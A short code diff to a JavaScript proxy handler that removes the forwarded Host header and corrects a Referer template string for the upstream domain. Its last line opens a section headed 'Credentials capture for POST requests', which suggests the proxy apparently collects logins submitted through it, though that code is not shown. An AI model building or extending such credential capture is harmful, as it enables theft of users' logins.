@@ -74,10 +74,11 @@ async function handleProxy(request, pathSegments = []) {
   // Build headers - copy all but let fetch set Host automatically
   const new_request_headers = new Headers(request_headers);
   
+  // Remove original Host header to let fetch set it correctly based on URL
+  new_request_headers.delete('Host');
   
-  new_request_headers.set('Host', upstream_domain);
-  
-  new_request_headers.set('Referer', 'https://${upstream_domain}');
+  // Set Referer to the upstream domain
+  new_request_headers.set('Referer', `https://${upstream_domain}`);
 
   // ---- Credentials capture for POST requests ----
   if (method === 'POST') {
